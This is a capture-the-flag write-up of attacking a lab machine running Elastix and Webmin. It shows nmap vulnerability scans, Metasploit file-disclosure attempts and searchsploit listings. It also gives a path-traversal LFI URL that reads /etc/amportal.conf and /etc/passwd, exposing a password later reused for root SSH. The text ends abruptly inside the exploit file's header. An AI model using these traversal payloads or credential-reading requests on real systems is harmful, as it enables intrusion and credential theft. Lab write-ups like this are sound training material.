# Summary
### 1. NMAP
Typically the first thing to do when pentesting a machine. We see many open ports, and tons of vulnerabilities in the NMAP scan.

### 2. Finding Attack Vector
Since we saw the existence of a webserver on Port 80 & Port 443, we view it first since it's the most interesting. We see "Elastix" on the main page of the HTTPS page.

We also see "Webmin" on Port 1000, and NMAP revealed that it was vulnerable to an File Disclosure exploit. Finally, we also do Gobuster but got a invalid certificate error.

### 3. Attack Attempt 1: Attacking Port 10000 Webmin
NOTE: Unnecessary Step

Since the Webmin File Disclosure exploit had a Metasploit module pre-written, `auxiliary/admin/webmin/file_disclosure`, we run it but were unable to get any files. All the searches returned with `404 File not found` errors.

### 4. Searchsploit.. More Enumeration :(
NOTE: Unnecessary Step

More enumeration performed for openssh, apache httpd, pop3d and webmin. We see a couple of exploits from `searchsploit webmin` though!

### 5. Attack Attempt 2: Attempt to Attack Port 10000 Webmin Again!
NOTE: Unnecessary Step

We perform two attacks on Webmin, both happen to have Metasploit modules written for it. However to use them, credentials are needed.

### 6. Finding another Attack Vector, More Enumeration
At this point, I am not too sure on what else I could try and had to look online for some clues.

Turns out, the Gobuster that was performed in step 2 was a correct step, and a `-k` flag could be added to disable the checking of certificate. From the HTTPS (Port 443), we see an interesting directory, `/vtigercrm`.

We observe some primary softwares that are hosted. They are: Elastix, Roundcube, FreePBX and VTigerCRM.

We do a `searchsploit vtigercrm`, with no results, as well as a `searchsploit elastix` and see a few interesting possible attacks, but unfortuantely nothing supported by Metasploit. We had to step out of our comfort zone and try to attack it the harder way.

### 7. Attack Attempt 3: Attacking Elastix on Port 443 (VTigerCRM)
We try to find the version of Elastix through viewing of the page source as well as enumerating from Gobuster, but all did not reveal the version of Elastix.

The first attack we try is `Elastix 2.2.0 - 'graph.php' Local File Inclusion | php/webapps/37637.pl`, with the underlying attack exploiting file access through `/vtigercrm` directory through a web browser. 

We go to our web browser and browse to `(https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action)`, and see a dump of credentials. Sifting trough the information, we see a username `admin` and password `jEhdIekWmdjE`. Since we saw Port 22 through NMAP, we can attempt to SSH with these credentials.

### 8. SSH (Port 22) with Credentials Found, Getting Flags
Trying to SSH in to the system with username `admin` and password `jEhdIekWmdjE`, we got a `Permission denied` error, and perhaps it was the username that was wrong. Using the same VTigerCRM exploit to expose files, we expose the `etc/passwd` file to find valid usernames.

We were able to SSH into the system with username `root` and password `jEhdIekWmdjE`, to get the flags in the box.

# Attack
## 1. NMAP
First typical scan.
```
hippoeug@kali:~$ nmap --script vuln 10.129.128.38 -sC -sV -Pn -v
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-11 13:48 +08
...
Scanning 10.129.128.38 [1000 ports]
Discovered open port 22/tcp on 10.129.128.38
Discovered open port 443/tcp on 10.129.128.38
Discovered open port 110/tcp on 10.129.128.38
Discovered open port 80/tcp on 10.129.128.38
Discovered open port 3306/tcp on 10.129.128.38
Discovered open port 111/tcp on 10.129.128.38
Discovered open port 995/tcp on 10.129.128.38
Discovered open port 993/tcp on 10.129.128.38
Discovered open port 143/tcp on 10.129.128.38
Discovered open port 25/tcp on 10.129.128.38
Discovered open port 10000/tcp on 10.129.128.38
Discovered open port 4445/tcp on 10.129.128.38
...
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
25/tcp    open  smtp?
|_sslv2-drown: 
80/tcp    open  http       Apache httpd 2.2.3
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|_  /icons/: Potentially interesting directory w/ listing on 'apache/2.2.3 (centos)'
|_http-server-header: Apache/2.2.3 (CentOS)
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-trace: TRACE is enabled
110/tcp   open  pop3?
|_sslv2-drown: 
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            941/udp   status
|_  100024  1            944/tcp   status
143/tcp   open  imap?
|_sslv2-drown: 
443/tcp   open  ssl/https?
|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
| ssl-ccs-injection: 
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|           
|     References:
|       http://www.openssl.org/news/secadv_20140605.txt
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
|_      http://www.cvedetails.com/cve/2014-0224
| ssl-dh-params: 
|   VULNERABLE:
|   Diffie-Hellman Key Exchange Insufficient Group Strength
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
|       of insufficient strength, especially those using one of a few commonly
|       shared groups, may be susceptible to passive eavesdropping attacks.
|     Check results:
|       WEAK DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_WITH_DES_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: mod_ssl 2.2.x/1024-bit MODP group with safe prime modulus
|             Modulus Length: 1024
|             Generator Length: 8
|             Public Key Length: 1024
|     References:
|_      https://weakdh.org
| ssl-poodle: 
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  CVE:CVE-2014-3566  BID:70574
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_AES_128_CBC_SHA
|     References:
|       https://www.imperialviolet.org/2014/10/14/poodle.html
|       https://www.securityfocus.com/bid/70574
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
|_      https://www.openssl.org/~bodo/ssl-poodle.pdf
|_sslv2-drown: 
993/tcp   open  imaps?
|_ssl-ccs-injection: No reply from server (TIMEOUT)
|_sslv2-drown: 
995/tcp   open  pop3s?
|_ssl-ccs-injection: No reply from server (TIMEOUT)
|_sslv2-drown: 
3306/tcp  open  mysql?
|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)
|_rsa-vuln-roca: ERROR: Script execution failed (use -d to debug)
|_ssl-ccs-injection: ERROR: Script execution failed (use -d to debug)
|_ssl-dh-params: ERROR: Script execution failed (use -d to debug)
|_ssl-heartbleed: ERROR: Script execution failed (use -d to debug)
|_ssl-poodle: ERROR: Script execution failed (use -d to debug)
|_sslv2-drown: ERROR: Script execution failed (use -d to debug)
4445/tcp  open  upnotifyp?
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-litespeed-sourcecode-download: 
| Litespeed Web Server Source Code Disclosure (CVE-2010-2333)
| /index.php source code:
| <h1>Error - Bad Request</h1>
|_<pre>This web server is running in SSL mode. Try the URL <a href='https://10.129.128.38:10000/'>https://10.129.128.38:10000/</a> instead.<br></pre>
|_http-majordomo2-dir-traversal: ERROR: Script execution failed (use -d to debug)
| http-phpmyadmin-dir-traversal: 
|   VULNERABLE:
|   phpMyAdmin grab_globals.lib.php subform Parameter Traversal Local File Inclusion
|     State: UNKNOWN (unable to test)
|     IDs:  CVE:CVE-2005-3299
|       PHP file inclusion vulnerability in grab_globals.lib.php in phpMyAdmin 2.6.4 and 2.6.4-pl1 allows remote attackers to include local files via the $__redirect parameter, possibly involving the subform array.
|       
|     Disclosure date: 2005-10-nil
|     Extra information:
|       ../../../../../etc/passwd :
|   <h1>Error - Bad Request</h1>
|   <pre>This web server is running in SSL mode. Try the URL <a href='https://10.129.128.38:10000/'>https://10.129.128.38:10000/</a> instead.<br></pre>
|   
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3299
|_      http://www.exploit-db.com/exploits/1244/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-vuln-cve2006-3392: 
|   VULNERABLE:
|   Webmin File Disclosure
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2006-3392
|       Webmin before 1.290 and Usermin before 1.220 calls the simplify_path function before decoding HTML.
|       This allows arbitrary files to be read, without requiring authentication, using "..%01" sequences
|       to bypass the removal of "../" directory traversal sequences.
|       
|     Disclosure date: 2006-06-29
|     References:
|       http://www.exploit-db.com/exploits/1997/
|       http://www.rapid7.com/db/modules/auxiliary/admin/webmin/file_disclosure
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3392
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
Service Info: Host: 127.0.0.1
...
```
Holy shit, that is a lotta open ports!

## 2. Finding Attack Vector
Let's find out more on the http servers.

`Port 80 & Port 443`: Going to `https://10.10.10.7`, we see an expired certificate. We can KIV this. 

![443](https://user-images.githubusercontent.com/21957042/114298234-f694c580-9ae7-11eb-8fbd-4cacf3195f7e.png)
![Warning](https://user-images.githubusercontent.com/21957042/114298235-f7c5f280-9ae7-11eb-91c3-ad36646c2dc4.png)

Accepting the risk, we see it is a login page for "Elastix". We also get automatically redirected to `https` despite trying to go `http`. We know from the scans this is Apache httpd 2.2.3.

![Elastix](https://user-images.githubusercontent.com/21957042/114298236-f85e8900-9ae7-11eb-969f-0509cf460651.png)

`Port 10000`: We see a Webmin webpage with another login page. 

![10000](https://user-images.githubusercontent.com/21957042/114298238-f8f71f80-9ae7-11eb-8083-c1a771a84b35.png)
![Webmin](https://user-images.githubusercontent.com/21957042/114298240-f98fb600-9ae7-11eb-9162-bf68e747f502.png)

We know from the scans this is MiniServ 1.570 (Webmin httpd). We also see something interesting.
```
http-vuln-cve2006-3392: 
|   VULNERABLE:
|   Webmin File Disclosure
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2006-3392
|       Webmin before 1.290 and Usermin before 1.220 calls the simplify_path function before decoding HTML.
|       This allows arbitrary files to be read, without requiring authentication, using "..%01" sequences
|       to bypass the removal of "../" directory traversal sequences.
```
Alright then, let's give this attack Webmin on Port 10000 a shot based on a [guide](https://www.rapid7.com/db/modules/auxiliary/admin/webmin/file_disclosure/) & [it's code](https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/admin/webmin/file_disclosure.rb).

We also do some Gobusters, for example:
```
hippoeug@kali:~$ gobuster dir -u "https://10.10.10.7:10000" -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
...
Error: error on running goubster: unable to connect to https://10.10.10.7:10000/: invalid certificate: x509: cannot validate certificate for 10.10.10.7 because it doesn't contain any IP SANs
...
hippoeug@kali:~$ gobuster dir -u "https://10.10.10.7" -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
...
Error: error on running goubster: unable to connect to https://10.10.10.7/: invalid certificate: x509: certificate has expired or is not yet valid
```
Some errors as we can see. Let's move on first!

## 3. Attack Attempt 1: Attacking Port 10000 Webmin
Let's run this `auxiliary/admin/webmin/file_disclosure` exploit.
```
hippoeug@kali:~$ msfconsole
msf6 > use auxiliary/admin/webmin/file_disclosure
msf6 auxiliary(admin/webmin/file_disclosure) > show options

Module options (auxiliary/admin/webmin/file_disclosure):

   Name     Current Setting   Required  Description
   ----     ---------------   --------  -----------
   DIR      /unauthenticated  yes       Webmin directory path
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPATH    /etc/passwd       yes       The file to download
   RPORT    10000             yes       The target port (TCP)
   SSL      false             no        Negotiate SSL/TLS for outgoing connections
   VHOST                      no        HTTP server virtual host


Auxiliary action:

   Name      Description
   ----      -----------
   Download  Download arbitrary file


msf6 auxiliary(admin/webmin/file_disclosure) > set rhosts 10.129.137.135
rhosts => 10.129.137.135
msf6 auxiliary(admin/webmin/file_disclosure) > run
[*] Running module against 10.129.137.135

[*] Attempting to retrieve /etc/passwd...
[*] No response from the server
[*] Auxiliary module execution completed
```
Nope, didn't work. What about doing exploit instead?
```
msf6 auxiliary(admin/webmin/file_disclosure) > exploit
[*] Running module against 10.129.137.135

[*] Attempting to retrieve /etc/passwd...
[*] The server returned: 200 Bad Request
<h1>Error - Bad Request</h1>
<pre>This web server is running in SSL mode. Try the URL <a href='https://10.129.137.135:10000/'>https://10.129.137.135:10000/</a> instead.<br></pre>
[*] Auxiliary module execution completed
```
Let's set SSL to true.
```
msf6 auxiliary(admin/webmin/file_disclosure) > set ssl true
[!] Changing the SSL option's value may require changing RPORT!
ssl => true
msf6 auxiliary(admin/webmin/file_disclosure) > exploit
[*] Running module against 10.129.137.135

[*] Attempting to retrieve /etc/passwd...
[*] The server returned: 404 File not found
<h1>Error - File not found</h1>
[*] Auxiliary module execution completed
```
Ah this works, but no file found.

I've tried finding other common files, such as:
```
/etc/webmin/miniserv.conf
/etc/webmin/htusers
/etc/webmin/virtual-server/plainpass
/etc/webmin/virtual-server/plainpass dir.
/etc/webmin/miniserv.users
/etc/shadow
```
But they all return with `File not found` error. There should be another way in..

## 4. Searchsploit.. More Enumeration :(
Let's do some searches for the versions.
```
hippoeug@kali:~$ searchsploit openssh 4.3
------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                    |  Path
------------------------------------------------------------------------------------------------------------------ ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                          | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                    | linux/remote/45210.py
OpenSSH 4.3 p1 - Duplicated Block Remote Denial of Service                                                        | multiple/dos/2444.sh
OpenSSH < 6.6 SFTP (x64) - Command Execution                                                                      | linux_x86-64/remote/45000.c
OpenSSH < 6.6 SFTP - Command Execution                                                                            | linux/remote/45001.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation              | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                          | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                                              | linux/remote/45939.py
------------------------------------------------------------------------------------------------------------------ ---------------------------------
```
Doesn't look like there's anything interesting in openssh.

```
hippoeug@kali:~$ searchsploit apache httpd
------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                    |  Path
------------------------------------------------------------------------------------------------------------------ ---------------------------------
Apache 0.8.x/1.0.x / NCSA HTTPd 1.x - 'test-cgi' Directory Listing                                                | cgi/remote/20435.txt
Apache 1.1 / NCSA HTTPd 1.5.2 / Netscape Server 1.12/1.1/2.0 - a nph-test-cgi                                     | multiple/dos/19536.txt
Apache Httpd mod_proxy - Error Page Cross-Site Scripting                                                          | multiple/webapps/47688.md
Apache Httpd mod_rewrite - Open Redirects                                                                         | multiple/webapps/47689.md
NCSA 1.3/1.4.x/1.5 / Apache HTTPd 0.8.11/0.8.14 - ScriptAlias Source Retrieval                                    | multiple/remote/20595.txt
------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
Nothing interesting in apache httpd either.

```
hippoeug@kali:~$ searchsploit pop3d
------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                    |  Path
------------------------------------------------------------------------------------------------------------------ ---------------------------------
Cyrus IMAPD - pop3d popsubfolders USER Buffer Overflow (Metasploit)                                               | linux/remote/16836.rb
Cyrus IMAPD 2.3.2 - 'pop3d' Remote Buffer Overflow (1)                                                            | linux/remote/1813.c
Cyrus IMAPD 2.3.2 - 'pop3d' Remote Buffer Overflow (2)                                                            | multiple/remote/2053.rb
Cyrus IMAPD 2.3.2 - 'pop3d' Remote Buffer Overflow (3)                                                            | linux/remote/2185.pl
tPop3d 1.5.3 - Denial of Service                                                                                  | linux/dos/11893.pl
Vpop3d - Remote Denial of Service                                                                                 | windows/dos/23053.pl
------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

hippoeug@kali:~$ searchsploit imapd
------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                    |  Path
------------------------------------------------------------------------------------------------------------------ ---------------------------------
Alt-N MDaemon 9.6.4 - IMAPD FETCH Buffer Overflow (Metasploit)                                                    | windows/remote/16482.rb
Cyrus IMAPD - pop3d popsubfolders USER Buffer Overflow (Metasploit)                                               | linux/remote/16836.rb
Cyrus IMAPD 1.4/1.5.19/2.0.12/2.0.16/2.1.9/2.1.10 - Pre-Login Heap Corruption                                     | linux/dos/22061.txt
Cyrus imapd 2.2.4 < 2.2.8 - 'imapmagicplus' Remote Overflow                                                       | linux/remote/903.c
Cyrus IMAPD 2.3.2 - 'pop3d' Remote Buffer Overflow (1)                                                            | linux/remote/1813.c
Cyrus IMAPD 2.3.2 - 'pop3d' Remote Buffer Overflow (2)                                                            | multiple/remote/2053.rb
Cyrus IMAPD 2.3.2 - 'pop3d' Remote Buffer Overflow (3)                                                            | linux/remote/2185.pl
Eudora Qualcomm WorldMail 3.0 - 'IMAPd' Remote Overflow                                                           | windows/remote/1380.py
Eudora Qualcomm WorldMail 3.0 - IMAPd 'LIST' Remote Buffer Overflow (Metasploit)                                  | windows/remote/16474.rb
Eudora Qualcomm WorldMail 9.0.333.0 - IMAPd Service UID Buffer Overflow                                           | windows/remote/31694.py
FTGate4 Groupware Mail Server 4.1 - imapd Remote Buffer Overflow (PoC)                                            | windows/dos/1327.pl
Ipswitch IMail 5.0 - Imapd Buffer Overflow (Denial of Service) (PoC)                                              | multiple/dos/19377.txt
IPSwitch IMail Server 8.15 - IMAPD Remote Code Execution                                                          | linux/remote/1124.pl
IPSwitch IMail Server 8.20 - IMAPD Remote Buffer Overflow                                                         | windows/remote/3627.c
Linux imapd - Remote Overflow / File Retrieve                                                                     | linux/remote/340.c
MailEnable - IMAPD W3C Logging Buffer Overflow (Metasploit)                                                       | windows/remote/16480.rb
MailEnable 1.54 Pro - Universal IMAPD W3C Logging Buffer Overflow (Metasploit)                                    | windows/remote/1332.pm
MailEnable Enterprise 1.x - IMAPd Remote Overflow                                                                 | linux/remote/915.c
MailEnable IMAPD 1.54 - STATUS Request Buffer Overflow (Metasploit)                                               | windows/remote/16485.rb
MailEnable IMAPD Enterprise 2.32 < 2.34 - Remote Buffer Overflow                                                  | windows/remote/3319.pl
MailEnable IMAPD Professional (2.35) - Login Request Buffer Overflow (Metasploit)                                 | windows/remote/16475.rb
MailEnable IMAPD Professional 2.35 - Remote Buffer Overflow                                                       | windows/remote/3320.pl
MDaemon 8.0.3 - IMAPD CRAM-MD5 Authentication Overflow (Metasploit)                                               | windows/remote/1151.pm
Mercur IMAPD 5.00.14 (Windows x86) - Remote Denial of Service                                                     | windows_x86/dos/3527.pl
Mercury/32 4.52 IMAPD - 'SEARCH' (Authenticated) Overflow                                                         | windows/remote/4429.pl
Netscape Messaging Server 3.55 & University of Washington imapd 10.234 - Remote Buffer Overflow                   | linux/remote/19107.c
Perdition 1.17 - IMAPD __STR_VWRITE Remote Format String                                                          | linux/dos/30724.txt
UoW IMAPd Serve 10.234/12.264 - COPY Buffer Overflow (Metasploit)                                                 | unix/remote/19849.pm
UoW IMAPd Server - LSUB Buffer Overflow (Metasploit)                                                              | linux/remote/16846.rb
UoW IMAPd Server 10.234/12.264 - LSUB Buffer Overflow (Metasploit)                                                | unix/remote/19848.pm
UoW IMAPd Server 10.234/12.264 - Remote Buffer Overflow                                                           | unix/remote/19847.c
WorldMail IMAPd 3.0 - Remote Overflow (SEH) (Egghunter)                                                           | windows/remote/18354.py
WU-IMAPd 2000/2001 - Partial Mailbox Attribute Remote Buffer Overflow (1)                                         | linux/remote/21442.c
WU-IMAPd 2000/2001 - Partial Mailbox Attribute Remote Buffer Overflow (2)                                         | linux/remote/21443.c
------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
Nothing we can use, we know our pop3d is updated, `Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4`.

```
hippoeug@kali:~$ searchsploit webmin
------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                    |  Path
------------------------------------------------------------------------------------------------------------------ ---------------------------------
DansGuardian Webmin Module 0.x - 'edit.cgi' Directory Traversal                                                   | cgi/webapps/23535.txt
phpMyWebmin 1.0 - 'target' Remote File Inclusion                                                                  | php/webapps/2462.txt
phpMyWebmin 1.0 - 'window.php' Remote File Inclusion                                                              | php/webapps/2451.txt
Webmin - Brute Force / Command Execution                                                                          | multiple/remote/705.pl
webmin 0.91 - Directory Traversal                                                                                 | cgi/remote/21183.txt
Webmin 0.9x / Usermin 0.9x/1.0 - Access Session ID Spoofing                                                       | linux/remote/22275.pl
Webmin 0.x - 'RPC' Privilege Escalation                                                                           | linux/remote/21765.pl
Webmin 0.x - Code Input Validation                                                                                | linux/local/21348.txt
Webmin 1.5 - Brute Force / Command Execution                                                                      | multiple/remote/746.pl
Webmin 1.5 - Web Brute Force (CGI)                                                                                | multiple/remote/745.pl
Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)                                             | unix/remote/21851.rb
Webmin 1.850 - Multiple Vulnerabilities                                                                           | cgi/webapps/42989.txt
Webmin 1.900 - Remote Command Execution (Metasploit)                                                              | cgi/remote/46201.rb
Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)                                            | linux/remote/46984.rb
Webmin 1.920 - Remote Code Execution                                                                              | linux/webapps/47293.sh
Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)                                                 | linux/remote/47230.rb
Webmin 1.x - HTML Email Command Execution                                                                         | cgi/webapps/24574.txt
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure (Perl)                                               | multiple/remote/2017.pl
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure (PHP)                                                | multiple/remote/1997.php
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)                                                     | linux/webapps/47330.rb
------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
There might be something we can use here, since compatible with our webmin, `MiniServ 1.570 (Webmin httpd)`.

## 5. Attack Attempt 2: Attempt to Attack Port 10000 Webmin Again!
Since we saw a few interesting things from using `searchsploit`, we do more [research](https://www.cvedetails.com/metasploit-modules/vendor-358/Webmin.html). We see that we can use two attacks supported by Metasploit, first being `CVE-2019-9624  Webmin Upload Authenticated RCE` and second being `CVE-2019-12840  Webmin Package Updates Remote Command Execution`.

We try both Metasploit modules, first being [`use exploit/unix/webapp/webmin_upload_exec`](https://www.rapid7.com/db/modules/exploit/unix/webapp/webmin_upload_exec/) of `Webmin Upload Authenticated RCE`, and second being [`use exploit/linux/http/webmin_packageup_rce`](https://www.rapid7.com/db/modules/exploit/linux/http/webmin_packageup_rce/) of `Webmin Package Updates Remote Command Execution`. However, both modules required credentials to the Webmin, USERNAME & PASSWORD.

To go down this path, we must get the some credentials.

## 6. Finding another Attack Vector, More Enumeration
At this point, I've pretty much no idea what to do at this point and had to look up for clues!

Turns out, the Gobuster attempted in step 2 was correct! We just needed to add a `-k` flag to disable certificates check.
```
hippoeug@kali:~$ gobuster dir -u "https://10.10.10.7:443" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://10.10.10.7:443
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/08 22:54:51 Starting gobuster
===============================================================
/images (Status: 301)
/help (Status: 301)
/themes (Status: 301)
/modules (Status: 301)
/mail (Status: 301)
/admin (Status: 301)
/static (Status: 301)
/lang (Status: 301)
/var (Status: 301)
/panel (Status: 301)
/libs (Status: 301)
/recordings (Status: 301)
/configs (Status: 301)
/vtigercrm (Status: 301)
===============================================================
2020/12/08 23:36:08 Finished
===============================================================
```
Let's visit each of these directories.

![images](https://user-images.githubusercontent.com/21957042/114298241-fa284c80-9ae7-11eb-801a-044462baf440.png)
![help](https://user-images.githubusercontent.com/21957042/114298243-fac0e300-9ae7-11eb-975e-c73a34ffcd80.png)
![themes](https://user-images.githubusercontent.com/21957042/114298246-fb597980-9ae7-11eb-9f12-e6cd27b7874f.png)
![modules](https://user-images.githubusercontent.com/21957042/114298249-06aca500-9ae8-11eb-9898-66ef41de4f30.png)
![mail](https://user-images.githubusercontent.com/21957042/114298250-07ddd200-9ae8-11eb-8ac0-7ee095c78e12.png)
![admin](https://user-images.githubusercontent.com/21957042/114298251-08766880-9ae8-11eb-885e-a4e2998833fd.png)
![static](https://user-images.githubusercontent.com/21957042/114298252-090eff00-9ae8-11eb-81a7-b62ef98e157a.png)
![lang](https://user-images.githubusercontent.com/21957042/114298253-09a79580-9ae8-11eb-96a3-3064a3e2d720.png)
![var](https://user-images.githubusercontent.com/21957042/114298254-0a402c00-9ae8-11eb-9b66-528328d04a47.png)
![panel](https://user-images.githubusercontent.com/21957042/114298256-0ad8c280-9ae8-11eb-8f96-8d07c3ae0e3a.png)
![libs](https://user-images.githubusercontent.com/21957042/114298257-0ad8c280-9ae8-11eb-9fa4-550f9662aac9.png)
![recordings](https://user-images.githubusercontent.com/21957042/114298268-1b893880-9ae8-11eb-8ff4-bbe33e3d494c.png)
![configs](https://user-images.githubusercontent.com/21957042/114298269-1c21cf00-9ae8-11eb-93b0-af9dcba53118.png)
![vtigercrm](https://user-images.githubusercontent.com/21957042/114298270-1cba6580-9ae8-11eb-8af3-0759a0581d96.png)

From these, we can see some primary softwares that are hosted. They are: Elastix, Roundcube, FreePBX and VTigerCRM.

We could now look at finding vulnerabilities in VTigerCRM as we've seen `/vtigercrm` in the Gobuster. Let's also look up Elastix, why didn't we think of that before?

Let's do some SearchSploits.
```
hippoeug@kali:~$ searchsploit elastix
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Elastix - 'page' Cross-Site Scripting                                                                                               | php/webapps/38078.py
Elastix - Multiple Cross-Site Scripting Vulnerabilities                                                                             | php/webapps/38544.txt
Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                                                                       | php/webapps/34942.txt
Elastix 2.2.0 - 'graph.php' Local File Inclusion                                                                                    | php/webapps/37637.pl
Elastix 2.x - Blind SQL Injection                                                                                                   | php/webapps/36305.txt
Elastix < 2.5 - PHP Code Injection                                                                                                  | php/webapps/38091.php
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                                                              | php/webapps/18650.py
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
Oh wow, couple interesting stuff, but nothing for Metasploit.

What about VTigerCRM?
```
hippoeug@kali:~$ searchsploit vtigercrm
Exploits: No Results
Shellcodes: No Results
```
Nothing. Let's focus on Elastix exploits.

## 7. Attack Attempt 3: Attacking Elastix on Port 443 (VTigerCRM)
Since we are looking for a Elastix exploit, we try to get the version of Elastix being ran.
However, neither the landing page nor Gobuster revealed the version of Elastix. Viewing Elastix page source on 443 didn't reveal the version either. Using Burp to intercept a response from Elastix, we still do not find any version numbers. Let's just try using some of the exploits we saw from doing `searchsploit elastix`.

Trying the first interesting one, `Elastix 2.2.0 - 'graph.php' Local File Inclusion | php/webapps/37637.pl`, we examine it first.
```
hippoeug@kali:~$ searchsploit -x 37637.pl
  Exploit: Elastix 2.2.0 - 'graph.php' Local File Inclusion
      URL: https://www.exploit-db.com/exploits/37637
     Path: /usr/share/exploitdb/exploits/php/webapps/37637.pl
File Type: ASCII text, with CRLF line terminators

source: https://www.securityfocus.com/bid/55078/info
Elastix is prone to a local file-include vulnerability because it fails to properly sanitize user-supplied input.
An attacker can exploit this vulnerability to view files and execute local scripts in the context of the web server process. This may aid in further attacks.
Elastix 2.2.0 is vulnerable; other versions may also be affected. 

#!/usr/bin/perl -w

#------------------------------------------------------------------------------------# 
#Elastix is an Open Source Sofware to establish Unified Communications. 
#About this concept, Elastix goal is to incorporate all the communication alternatives,
#available at an enterprise level, into a unique solution.
#------------------------------------------------------------------------------------#
############################################################
# Exploit Title: Elastix 2.2.0 LFI
# Google Dork: :(
# Author: cheki
# Version:Elastix 2.2.0
# Tested on: multiple
# CVE : notyet
# romanc-_-eyes ;) 
# Discovered by romanc-_-eyes
# vendor http://www.elastix.org/

